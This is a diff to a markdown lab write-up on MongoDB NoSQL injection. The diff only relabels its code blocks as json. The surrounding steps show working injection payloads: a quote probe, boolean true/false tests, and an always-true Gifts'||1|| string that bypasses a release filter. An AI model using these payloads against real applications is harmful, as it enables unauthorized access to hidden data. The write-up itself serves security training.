@@ -13,7 +13,7 @@ Exploiting a MongoDB NoSQL injection in the category filter by injecting JavaScr
 
 This lab demonstrates **NoSQL Injection** in **MongoDB**, where user input is inserted directly into a JavaScript expression such as:
 
-```
+```json
 this.category == '<input>'
 ```
 
@@ -72,7 +72,7 @@ Open a category → Intercept in Burp → Send to Repeater.
 
 ### **2️⃣ Test for syntax injection**
 Payload:
-```
+```json
 Gifts'
 ```
 
@@ -82,7 +82,7 @@ Gifts'
 
 ### **3️⃣ Restore valid syntax to verify controlled injection**
 Payload:
-```
+```json
 Gifts'+'
 ```
 
@@ -94,13 +94,13 @@ Gifts'+'
 ### **4️⃣ Test boolean-based NoSQL logic injection**
 
 #### ❌ False condition:
-```
+```json
 Gifts' && 0 && 'x
 ```
 ➡ No products → **False condition applied.**
 
 #### ✔ True condition:
-```
+```json
 Gifts' && 1 && 'x
 ```
 ➡ Products return → **True condition manipulated backend logic.**
@@ -110,13 +110,13 @@ Gifts' && 1 && 'x
 ### **5️⃣ Inject always-true condition to bypass release filter**
 
 Payload:
-```
+```json
 Gifts'||1||'
 ```
 (Then URL-encode)
 
 Backend becomes:
-```
+```json
 this.category == 'Gifts' || 1
 ```
 
